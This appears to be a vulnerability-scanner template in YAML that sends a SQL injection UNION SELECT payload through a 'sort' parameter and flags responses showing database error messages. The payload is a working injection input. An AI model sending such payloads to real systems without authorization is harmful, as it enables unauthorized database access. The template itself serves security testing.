id: sqli7-394
name: 'UNION probe in sort'
severity: high
type: active
tags:
  - sqli
  - injection
  - union
description: 'Triggers DB error via sort'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      sort:
        - ''' UNION SELECT database()--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'SQL syntax'
          - 'mysql_fetch'
          - 'PostgreSQL'
          - 'ODBC'
          - 'ORA-'
          - 'SQLite'
